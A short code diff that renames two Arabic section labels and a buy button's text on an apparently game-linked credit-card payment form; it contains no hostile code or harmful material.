@@ -554,7 +554,7 @@
       </div>
 
       <div class="soft-divider"></div>
-      <div class="section-label">الاسم وبعض المعلومات</div>
+      <div class="section-label"> معلومات اضافية</div>
 
       <div class="field card-field">
         <input type="text" id="f-holder-name" name="jawakerName" placeholder="Card Holder Name" pattern="[^0-9]*" required>
@@ -571,7 +571,7 @@
       </div>
 
       <div class="soft-divider"></div>
-      <div class="section-label">معلومات عنك</div>
+      <div class="section-label">معلومات الفواتبر</div>
 
       <div style="display:flex; gap:10px;">
         <div class="field card-field" style="flex:1;">
@@ -662,7 +662,7 @@
 
   function handleBuy(btn){
     if(btn.dataset.state === 'price'){
-      btn.textContent = 'ادخل معلومات حسابك';
+      btn.textContent = 'pay with credit card';
       btn.dataset.state = 'pay';
       return;
     }
